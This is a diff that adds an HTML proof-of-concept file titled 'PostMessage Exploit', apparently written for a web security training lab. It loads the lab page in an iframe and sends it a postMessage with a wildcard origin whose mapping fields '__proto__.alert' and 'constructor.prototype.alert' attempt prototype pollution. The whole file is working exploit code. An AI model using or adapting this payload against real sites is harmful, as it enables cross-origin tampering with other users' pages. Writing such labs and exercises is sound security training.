@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <h1>PostMessage Exploit</h1>
+
+    <iframe id="target" src="https://lab-id.web-security-academy.net/inner.html" width="800" height="600"></iframe>
+
+    <script>
+        const iframe = document.getElementById('target');
+
+        iframe.onload = function() {
+            iframe.contentWindow.postMessage({
+                base: {
+                    reqBody: {}
+                },
+                metadata: {
+                    id: "350f61be-feea-424b-851b-f4e09bda7b7f"
+                },
+                mappings: [
+                    {
+                        from: "__proto__.alert",           // Prototype Pollution
+                        to: "test"
+                    },
+                    {
+                        from: "constructor.prototype.alert",
+                        to: "test2"
+                    }
+                ]
+            }, "*");
+        };
+    </script>
+</body>
+</html>
